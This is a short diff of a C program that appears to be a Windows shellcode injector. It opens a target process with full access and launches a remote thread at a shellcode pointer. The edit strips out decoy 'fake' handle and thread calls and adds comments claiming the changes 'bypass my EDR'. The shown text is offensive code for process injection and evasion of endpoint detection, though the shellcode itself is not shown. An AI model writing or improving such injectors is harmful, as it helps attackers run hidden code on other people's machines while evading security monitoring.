@@ -38,7 +38,6 @@ int main(int argc, char **argv) {
 	}
 	unsigned int pid = atoi(argv[1]);
 	
-	HANDLE process_handle_fake = OpenProcess(0, FALSE, pid);
 	HANDLE process_handle = OpenProcess(0x1f0fff, FALSE, pid);
 	if (process_handle == NULL) {
 		fputs("NULL process handle", stderr);
@@ -57,14 +56,13 @@ int main(int argc, char **argv) {
 		return 3;
 	}
 
-	HANDLE thread_handle_fake = CreateRemoteThread(process_handle, NULL, 0, 0, NULL, 0, NULL);
 	HANDLE thread_handle = CreateRemoteThread(process_handle, NULL, 0, shellcode_pointer, NULL, 0, NULL);
 	if (thread_handle == NULL) {
 		fputs("NULL thread handle", stderr);
 		return 4;
 	}
-	WaitForSingleObject(thread_handle_fake, 20000);
-	CloseHandle(thread_handle_fake);
+	WaitForSingleObject(thread_handle, 1000);
+	CloseHandle(thread_handle);  // bypass my EDR
 
-	CloseHandle(process_handle_fake);
+	CloseHandle(process_handle); // bypass my EDR
 }
